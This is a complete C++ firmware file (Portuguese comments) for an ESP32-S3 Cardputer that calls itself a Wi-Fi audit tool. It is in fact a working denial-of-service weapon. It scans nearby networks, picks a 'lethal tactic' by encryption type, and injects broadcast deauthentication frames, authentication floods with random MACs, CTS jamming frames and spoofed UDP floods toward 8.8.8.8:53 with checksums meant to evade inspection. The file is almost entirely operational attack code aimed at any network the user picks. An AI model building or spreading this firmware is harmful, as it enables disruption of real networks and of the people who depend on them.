/**
 * @file silver_bullet.cpp
 * @brief Silver Bullet - Ferramenta Avançada de Estresse Wi-Fi (Smart Recon V2)
 * @hardware M5Stack Cardputer (ESP32-S3)
 * @details
 * Firmware de auditoria de rede focado em injeção de pacotes Raw (L2, L3, L4).
 * Otimizado para 240MHz, com alocação DMA zero-copy e proteção contra Watchdog Starvation.
 * * Funcionalidades do Smart Recon V2 (Inteligência Tática):
 * - [AUTO] Identifica redes LEGACY (Open/WEP) e foca em inundação de gerência.
 * - [AUTO] Identifica roteadores WPA2 (Padrão) e aplica o Combo Fatal (Deauth + L3 NAT Meltdown).
 * - [AUTO] Detecta blindagem PMF (WPA3/Enterprise) e muda o ataque para CTS Jamming Físico.
 * - [AUTO] Avalia a integridade do RF (RSSI). Se o sinal for inferior a -75dBm, aborta ataques
 * L3 (para evitar perda de pacotes) e concentra 100% da energia em Jamming físico (CTS).
 */

#include <M5Unified.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <nvs_flash.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <atomic>
#include <lwip/def.h> 
#include <esp_heap_caps.h>
#include "driver/temperature_sensor.h"

// ===================================================================
// 1. ESTRUTURAS DE PACOTES OTIMIZADAS PARA DMA (Camadas L2, L3 e L4)
// ===================================================================
// Nota Técnica: Utilizamos apenas __attribute__((packed)) para evitar que o GCC
// insira bytes de preenchimento (padding) no final das structs, garantindo que
// os cabeçalhos físicos sejam transmitidos exatamente como a especificação 802.11 exige.

/** @brief Quadro de Desautenticação (L2) para derrubar clientes conectados */
struct __attribute__((packed)) DeauthPacket {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];
    uint8_t  mac_src[6];
    uint8_t  mac_bssid[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
};

/** @brief Quadro de Autenticação (L2) para esgotar a tabela CAM do AP */
struct __attribute__((packed)) AuthPacket {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];
    uint8_t  mac_src[6];
    uint8_t  mac_bssid[6];
    uint16_t seq_ctrl;
    uint16_t auth_algorithm;
    uint16_t auth_seq;
    uint16_t status_code;
};

/** @brief Quadro Clear-To-Send (L2) para silenciar a radiofrequência (Jamming) */
struct __attribute__((packed)) CtsPacket {
    uint16_t frame_control; 
    uint16_t duration;
    uint8_t  mac_ra[6];     
};

// --- Estruturas Auxiliares para Injeção L3/L4 (NAT Meltdown) ---

struct __attribute__((packed)) MacHeader {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  mac_dest[6];   
    uint8_t  mac_src[6];    
    uint8_t  mac_bssid[6];  
    uint16_t seq_ctrl;
};

struct __attribute__((packed)) LlcSnapHeader {
    uint8_t dsap;
    uint8_t ssap;
    uint8_t control;
    uint8_t oui[3];
    uint16_t ethertype;
};

struct __attribute__((packed)) IpHeader {
    uint8_t  version_ihl;   
    uint8_t  tos;
    uint16_t total_length;
    uint16_t id;
    uint16_t frag_off;      
    uint8_t  ttl;
    uint8_t  protocol;
    uint16_t checksum;
    uint8_t  ip_src[4];     
    uint8_t  ip_dest[4];    
};

struct __attribute__((packed)) UdpHeader {
    uint16_t src_port;
    uint16_t dest_port;
    uint16_t length;
    uint16_t checksum;
};

/** @brief Estrutura completa do pacote alocado em DMA contendo todas as camadas */
struct __attribute__((packed)) SilverBulletPacket {
    MacHeader mac;
    LlcSnapHeader llc;
    IpHeader ip;
    UdpHeader udp;
    uint8_t payload[128]; // Buffer variável para fragmentação de RAM
};

/** @brief Pseudo-Header necessário para cálculo válido do Checksum UDP (Bypass de Firewall) */
struct __attribute__((packed)) PseudoHeader {
    uint8_t src_ip[4];
    uint8_t dest_ip[4];
    uint8_t reserved;
    uint8_t protocol;
    uint16_t udp_length;
};

// ===================================================================
// 2. VARIÁVEIS GLOBAIS E CONTROLE ATÔMICO (Thread-Safety)
// ===================================================================

#define MAX_ALVOS 20
wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
uint16_t total_alvos = 0;
int alvo_selecionado = 0;

// Sincronização de dados entre Core 0 (Ataque) e Core 1 (UI/Monitoramento)
std::atomic<uint8_t> canal_atual_alvo{0};
std::atomic<int8_t> rssi_alvo{0};
std::atomic<bool> alvo_perdido{false};
std::atomic<bool> tx_power_max{true}; 
std::atomic<bool> flag_update_config{false}; 
std::atomic<bool> erro_memoria_critico{false}; 

std::atomic<uint32_t> pacotes_enviados_segundo{0};
std::atomic<uint32_t> pps_atual{0};

enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
std::atomic<EstadoFerramenta> estado_atual{ESTADO_ESCANEAR};

enum ModoAtaque { MODO_MANUAL_L2, MODO_MANUAL_L3, MODO_MANUAL_CTS, MODO_AUTOMATICO };
std::atomic<ModoAtaque> modo_ativo{MODO_AUTOMATICO};

/** @brief Categorias de vulnerabilidade identificadas pelo Smart Recon V2 */
enum EstrategiaAuto { 
    ESTRATEGIA_LEGACY_CRITICA, // Rede Open ou WEP (Totalmente vulnerável)
    ESTRATEGIA_WPA2_VULN,      // WPA2 sem PMF
    ESTRATEGIA_WPA3_BLINDADO,  // WPA3 ou Enterprise (Requer bypass CTS/L3)
    ESTRATEGIA_SINAL_FRACO,    // RSSI muito baixo (Apenas Jamming RF viável)
    ESTRATEGIA_DESCONHECIDA 
};
std::atomic<EstrategiaAuto> estrategia_atual{ESTRATEGIA_DESCONHECIDA};

uint32_t prng_state = 1;
temperature_sensor_handle_t temp_sensor = NULL;

/** @brief Retorna a string do modo atual para exibição na UI */
const char* get_nome_modo() {
    if (modo_ativo.load() != MODO_AUTOMATICO) return "MODO: OVERRIDE MANUAL";
    switch(estrategia_atual.load()) {
        case ESTRATEGIA_LEGACY_CRITICA: return "AUTO: LEGACY (SEM CRIPTO)";
        case ESTRATEGIA_WPA2_VULN:      return "AUTO: FATAL COMBO (L2+L3)";
        case ESTRATEGIA_WPA3_BLINDADO:  return "AUTO: STEALTH (CTS+L3)";
        case ESTRATEGIA_SINAL_FRACO:    return "AUTO: JAMMING RF (SINAL RUIM)";
        default:                        return "AUTO: ANALISANDO...";
    }
}

// ===================================================================
// 3. MOTORES MATEMÁTICOS DE ALTA PERFORMANCE (RAM/IRAM)
// ===================================================================

/** @brief Gerador Pseudo-Aleatório extremamente rápido (Xorshift) */
IRAM_ATTR inline uint32_t fast_rand() {
    uint32_t x = prng_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    return prng_state = x;
}

/** @brief Calcula Checksum Padrão para cabeçalho IPv4 */
IRAM_ATTR inline uint16_t calcular_checksum(void *vdata, size_t length) {
    uint16_t *data = (uint16_t *)vdata;
    uint32_t acc = 0;
    for (size_t i = 0; i < length / 2; ++i) acc += data[i];
    if (length & 1) {
        uint16_t word = 0;
        memcpy(&word, (uint8_t*)vdata + length - 1, 1);
        acc += word;
    }
    while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
    return ~acc;
}

/** @brief Calcula Checksum UDP válido com Pseudo-Header (Evade inspeção L3) */
IRAM_ATTR inline uint16_t calcular_udp_checksum(IpHeader *ip, UdpHeader *udp, uint8_t *payload, size_t payload_len) {
    PseudoHeader psd;
    memcpy(psd.src_ip, ip->ip_src, 4);
    memcpy(psd.dest_ip, ip->ip_dest, 4);
    psd.reserved = 0;
    psd.protocol = ip->protocol;
    psd.udp_length = udp->length;

    uint32_t acc = 0;
    uint16_t *psd_ptr = (uint16_t *)&psd;
    for (int i = 0; i < sizeof(PseudoHeader)/2; i++) acc += psd_ptr[i];
    
    uint16_t *udp_ptr = (uint16_t *)udp;
    for (int i = 0; i < sizeof(UdpHeader)/2; i++) acc += udp_ptr[i];

    uint16_t *pay_ptr = (uint16_t *)payload;
    for (size_t i = 0; i < payload_len / 2; ++i) acc += pay_ptr[i];
    if (payload_len & 1) {
        uint16_t word = 0;
        memcpy(&word, payload + payload_len - 1, 1);
        acc += word;
    }

    while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
    return ~acc;
}

// ===================================================================
// 4. MÓDULO DE RECONHECIMENTO AUTOMÁTICO (SMART RECON V2)
// ===================================================================

/**
 * @brief Analisa passivamente as características do AP alvo para decidir a tática letal.
 * @param indice_alvo Posição do alvo no array de APs escaneados.
 */
void analisar_alvo_automaticamente(int indice_alvo) {
    wifi_ap_record_t ap = alvos_encontrados[indice_alvo];
    
    // 1. Falha Física: Se o sinal for menor que -75dBm, a injeção L3/UDP sofrerá perdas massivas.
    if (ap.rssi < -75) {
        estrategia_atual.store(ESTRATEGIA_SINAL_FRACO);
    }
    // 2. Falha Crítica de Criptografia: Rede aberta ou com protocolo quebrado (WEP).
    else if (ap.authmode == WIFI_AUTH_OPEN || ap.authmode == WIFI_AUTH_WEP) {
        estrategia_atual.store(ESTRATEGIA_LEGACY_CRITICA);
    }
    // 3. Blindagem de Gestão Ativa: Protocolos modernos que descartam pacotes Deauth forjados.
    else if (ap.authmode == WIFI_AUTH_WPA3_PSK || 
             ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || 
             ap.authmode == WIFI_AUTH_ENTERPRISE) {
        estrategia_atual.store(ESTRATEGIA_WPA3_BLINDADO);
    } 
    // 4. Criptografia Padrão (WPA2 sem PMF): Completamente vulnerável a envenenamento.
    else {
        estrategia_atual.store(ESTRATEGIA_WPA2_VULN);
    }
}

// ===================================================================
// 5. INTERFACE E MONITORAMENTO (CORE 1)
// ===================================================================

void escanear_redes() {
    M5.Display.clear();
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.println("📡 Escaneando Redes...");

    esp_wifi_set_mode(WIFI_MODE_STA);
    
    wifi_scan_config_t scan_config = { .ssid = 0, .bssid = 0, .channel = 0, .show_hidden = true };
    esp_wifi_scan_start(&scan_config, true); 
    
    uint16_t max_aps = MAX_ALVOS;
    esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
    esp_wifi_scan_get_ap_num(&total_alvos);
    
    if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
    alvo_selecionado = 0;
    estado_atual.store(ESTADO_SELECIONAR);
}

void desenhar_menu() {
    M5.Display.clear();
    M5.Display.setCursor(0, 0);
    M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
    M5.Display.printf("⚡ PWR: %s | [A] = Auto\n", tx_power_max.load() ? "MAX (20dBm)" : "ECO (10dBm)");
    M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY);
    M5.Display.setCursor(0, 20);

    if (total_alvos == 0) {
        M5.Display.setTextColor(TFT_RED, TFT_BLACK);
        M5.Display.println("Nenhum alvo encontrado!");
        return;
    }

    int inicio = (alvo_selecionado / 5) * 5;
    for (int i = inicio; i < inicio + 5 && i < total_alvos; i++) {
        if (i == alvo_selecionado) M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); 
        else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        
        bool wpa3 = (alvos_encontrados[i].authmode == WIFI_AUTH_WPA3_PSK || alvos_encontrados[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
        M5.Display.printf("%d. %s %s\n", i + 1, alvos_encontrados[i].ssid, wpa3 ? "[WPA3]" : "");
    }
}

void task_display(void *pvParameters) {
    TickType_t ultimo_tempo_pps = xTaskGetTickCount();
    while (true) {
        TickType_t tempo_atual = xTaskGetTickCount();
        if ((tempo_atual - ultimo_tempo_pps) >= pdMS_TO_TICKS(1000)) {
            pps_atual.store(pacotes_enviados_segundo.exchange(0)); 
            ultimo_tempo_pps = tempo_atual;
        }

        if (estado_atual.load() == ESTADO_ATIRAR) {
            M5.Display.setCursor(0, 0);
            
            if (erro_memoria_critico.load()) {
                 M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                 M5.Display.println("ERRO CRITICO: FALHA DMA!");
                 M5.Display.println("Reinicie o Cardputer.");
                 vTaskDelay(pdMS_TO_TICKS(1000));
                 continue;
            }

            if (!alvo_perdido.load()) {
                M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                M5.Display.printf("⚔️ ALVO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
                
                float tsens_out = 0.0;
                if (temp_sensor != NULL) temperature_sensor_get_celsius(temp_sensor, &tsens_out);

                // Thermal Throttling: Protege o silício se o rádio operar demais em 20dBm
                if (tsens_out > 75.0 && tx_power_max.load()) {
                    tx_power_max.store(false); 
                    flag_update_config.store(true); 
                }
                
                M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                M5.Display.printf("CH: %d | TEMP: %.1fC | %s\n", 
                                  canal_atual_alvo.load(), tsens_out, tx_power_max.load() ? "MAX" : "ECO");

                M5.Display.setCursor(0, 40);
                M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                M5.Display.printf("> %s\n", get_nome_modo());
                
                M5.Display.setCursor(0, 60);
                M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
                M5.Display.printf(">> INJETANDO: %d PPS <<\n", pps_atual.load());
            } else {
                M5.Display.setCursor(0, 40);
                M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                M5.Display.printf("⚠️ ALVO PERDIDO / SCAN PAUSADO\n");
            }
        }
        vTaskDelay(pdMS_TO_TICKS(200)); 
    }
}

void task_monitoramento(void *pvParameters) {
    while (true) {
        // Bloqueia Active Scans enquanto atira para não crashar o driver de Wi-Fi.
        if (estado_atual.load() != ESTADO_ATIRAR) {
            vTaskDelay(pdMS_TO_TICKS(1000));
        } else {
            vTaskDelay(pdMS_TO_TICKS(2000));
        }
    }
}

// ===================================================================
// 6. MOTOR DE INJEÇÃO DMA E INTELIGÊNCIA APLICADA (CORE 0)
// ===================================================================

void task_ataque(void *pvParameters) {
    
    // Alocação direta na fila de hardware do rádio (Zero-Copy Malloc)
    SilverBulletPacket* pkt = (SilverBulletPacket*) heap_caps_malloc(sizeof(SilverBulletPacket), MALLOC_CAP_DMA);
    DeauthPacket* deauth = (DeauthPacket*) heap_caps_malloc(sizeof(DeauthPacket), MALLOC_CAP_DMA);
    AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
    CtsPacket* cts = (CtsPacket*) heap_caps_malloc(sizeof(CtsPacket), MALLOC_CAP_DMA);
    
    if (!pkt || !deauth || !auth || !cts) {
        if (pkt) heap_caps_free(pkt);
        if (deauth) heap_caps_free(deauth);
        if (auth) heap_caps_free(auth);
        if (cts) heap_caps_free(cts);
        erro_memoria_critico.store(true);
        vTaskDelete(NULL); 
    }
    
    prng_state = esp_random(); 
    if (prng_state == 0) prng_state = 1; 

    memset(pkt->payload, 0, sizeof(pkt->payload));
    
    pkt->llc.dsap = 0xAA;
    pkt->llc.ssap = 0xAA;
    pkt->llc.control = 0x03;
    pkt->llc.oui[0] = 0x00; pkt->llc.oui[1] = 0x00; pkt->llc.oui[2] = 0x00;
    pkt->llc.ethertype = htons(0x0800); 
    
    const size_t tamanho_header_fixo = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader);
    bool config_radio_aplicada = false;

    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load()) {
            
            if (!config_radio_aplicada || flag_update_config.load()) {
                esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 20); 
                esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                config_radio_aplicada = true;
                flag_update_config.store(false);
            }

            uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
            ModoAtaque modo = modo_ativo.load();
            EstrategiaAuto estrategia = estrategia_atual.load();

            // Setup L2 Headers
            deauth->frame_control = 0x00C0; 
            deauth->duration = 0; 
            deauth->reason_code = 0x0007; 
            memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
            memcpy(deauth->mac_src, mac_alvo, 6);
            memcpy(deauth->mac_bssid, mac_alvo, 6);

            auth->frame_control = 0x00B0; 
            auth->duration = 0; 
            auth->auth_algorithm = 0;
            auth->auth_seq = 1;
            auth->status_code = 0;
            memcpy(auth->mac_dest, mac_alvo, 6);
            memcpy(auth->mac_bssid, mac_alvo, 6);

            cts->frame_control = 0x00C4; 
            cts->duration = 32767;      
            memcpy(cts->mac_ra, mac_alvo, 6);

            // Setup L3 Header
            pkt->mac.frame_control = 0x0008; 
            pkt->mac.duration = 0;
            memcpy(pkt->mac.mac_dest, mac_alvo, 6);
            memcpy(pkt->mac.mac_bssid, mac_alvo, 6); 
            pkt->ip.version_ihl = 0x45; 
            pkt->ip.ttl = 64; 
            pkt->ip.protocol = 17; 

            // Aplicação da Inteligência (Smart Recon V2)
            bool atirar_l2 = (modo == MODO_MANUAL_L2) || 
                             (modo == MODO_AUTOMATICO && (estrategia == ESTRATEGIA_WPA2_VULN || estrategia == ESTRATEGIA_LEGACY_CRITICA));
                             
            bool atirar_cts = (modo == MODO_MANUAL_CTS) || 
                              (modo == MODO_AUTOMATICO && (estrategia == ESTRATEGIA_WPA3_BLINDADO || estrategia == ESTRATEGIA_SINAL_FRACO));
                              
            // Não injeta dados roteáveis (L3) se o sinal for extremamente fraco, economizando CPU.
            bool atirar_l3 = (modo == MODO_MANUAL_L3) || 
                             (modo == MODO_AUTOMATICO && estrategia != ESTRATEGIA_SINAL_FRACO);

            // --- DISPARO DE RAJADAS (BURST TRANSMISSION) ---
            
            if (atirar_l2) {
                for(int j = 0; j < 5; j++) { 
                    auth->mac_src[3] = fast_rand() & 0xFF; 
                    auth->mac_src[4] = fast_rand() & 0xFF; 
                    auth->mac_src[5] = fast_rand() & 0xFF;
                    auth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                    deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                    
                    if (esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
                    if (esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
                }
            }

            if (atirar_cts) {
                if (esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_OK) pacotes_enviados_segundo++;
            }

            if (atirar_l3) {
                for (int i = 0; i < 10; i++) { 
                    memcpy(pkt->mac.mac_src, mac_alvo, 3); 
                    pkt->mac.mac_src[3] = fast_rand() & 0xFF; 
                    pkt->mac.mac_src[4] = fast_rand() & 0xFF; 
                    pkt->mac.mac_src[5] = fast_rand() & 0xFF;

                    pkt->ip.id = (uint16_t)fast_rand(); 
                    pkt->ip.frag_off = 0; 
                    
                    pkt->ip.ip_src[0] = 192; 
                    pkt->ip.ip_src[1] = 168; 
                    pkt->ip.ip_src[2] = 0; 
                    pkt->ip.ip_src[3] = fast_rand() & 0xFF;
                    
                    pkt->ip.ip_dest[0] = 8; pkt->ip.ip_dest[1] = 8; pkt->ip.ip_dest[2] = 8; pkt->ip.ip_dest[3] = 8; 
                    
                    pkt->udp.src_port = htons(1024 + (fast_rand() % 60000)); 
                    pkt->udp.dest_port = htons(53); 
                    
                    size_t t_payload = 16 + (fast_rand() % 48); 
                    size_t t_injecao = tamanho_header_fixo + t_payload;
                    uint16_t ip_len = t_injecao - sizeof(MacHeader) - sizeof(LlcSnapHeader);
                    uint16_t udp_len = ip_len - sizeof(IpHeader);
                    
                    pkt->ip.total_length = htons(ip_len); 
                    pkt->udp.length = htons(udp_len);
                    
                    pkt->ip.checksum = 0; 
                    pkt->ip.checksum = calcular_checksum(&pkt->ip, sizeof(IpHeader)); 
                    
                    pkt->udp.checksum = 0;
                    pkt->udp.checksum = calcular_udp_checksum(&pkt->ip, &pkt->udp, pkt->payload, t_payload);
                    
                    if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) { 
                        taskYIELD(); 
                        break; 
                    } else {
                        pacotes_enviados_segundo++;
                    }
                }
            }

            // CRÍTICO: Prevenção de Starvation e Kernel Panic.
            // Cede a CPU de volta para a task Wi-Fi nativa liberar a RAM.
            taskYIELD(); 

        } else {
            config_radio_aplicada = false; 
            vTaskDelay(pdMS_TO_TICKS(100)); 
        }
    }
}

// ===================================================================
// 7. ENTRADA PRINCIPAL E CONTROLE TÁTICO
// ===================================================================

extern "C" void app_main(void) {
    auto cfg = M5.config(); 
    M5.begin(cfg);
    M5.Display.setRotation(1); 
    M5.Display.setTextSize(1.5);
    
    nvs_flash_init(); 
    esp_netif_init(); 
    esp_event_loop_create_default();
    
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_cfg); 
    esp_wifi_set_storage(WIFI_STORAGE_RAM); 
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start(); 
    esp_wifi_set_ps(WIFI_PS_NONE); 

    temperature_sensor_config_t ts_cfg = TEMPERATURE_SENSOR_CONFIG_DEFAULT(20, 100);
    if (temperature_sensor_install(&ts_cfg, &temp_sensor) == ESP_OK) {
        temperature_sensor_enable(temp_sensor);
    }

    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0); 
    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 

    escanear_redes(); 
    desenhar_menu();

    while (true) {
        M5.update(); 
        
        if (M5.Keyboard.isKeyPressed('A') || M5.Keyboard.isKeyPressed('a')) modo_ativo.store(MODO_AUTOMATICO);
        if (M5.Keyboard.isKeyPressed('1')) modo_ativo.store(MODO_MANUAL_L2);
        if (M5.Keyboard.isKeyPressed('2')) modo_ativo.store(MODO_MANUAL_L3);
        if (M5.Keyboard.isKeyPressed('3')) modo_ativo.store(MODO_MANUAL_CTS);

        if (estado_atual.load() == ESTADO_SELECIONAR) {
            if (total_alvos > 0) {
                if (M5.Keyboard.isKeyPressed(KEY_DOWN)) { 
                    alvo_selecionado = (alvo_selecionado + 1) % total_alvos; 
                    desenhar_menu(); 
                    vTaskDelay(pdMS_TO_TICKS(150)); 
                }
                if (M5.Keyboard.isKeyPressed(KEY_UP)) { 
                    alvo_selecionado = (alvo_selecionado - 1 + total_alvos) % total_alvos; 
                    desenhar_menu(); 
                    vTaskDelay(pdMS_TO_TICKS(150)); 
                }
            }
            if (M5.Keyboard.isKeyPressed(' ')) { 
                tx_power_max.store(!tx_power_max.load()); 
                desenhar_menu(); 
                vTaskDelay(pdMS_TO_TICKS(200)); 
            }
            
            if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
                if (total_alvos > 0) { 
                    canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary); 
                    analisar_alvo_automaticamente(alvo_selecionado);
                    modo_ativo.store(MODO_AUTOMATICO); 
                    
                    M5.Display.clear(); 
                    flag_update_config.store(true);
                    estado_atual.store(ESTADO_ATIRAR); 
                } else { 
                    escanear_redes(); 
                    desenhar_menu(); 
                }
                vTaskDelay(pdMS_TO_TICKS(300));
            }
        } 
        else if (estado_atual.load() == ESTADO_ATIRAR) {
            if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                estado_atual.store(ESTADO_SELECIONAR); 
                escanear_redes(); 
                desenhar_menu(); 
                vTaskDelay(pdMS_TO_TICKS(300));
            }
             if (M5.Keyboard.isKeyPressed(' ')) { 
                tx_power_max.store(!tx_power_max.load()); 
                flag_update_config.store(true);
                vTaskDelay(pdMS_TO_TICKS(200)); 
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10)); 
    }
}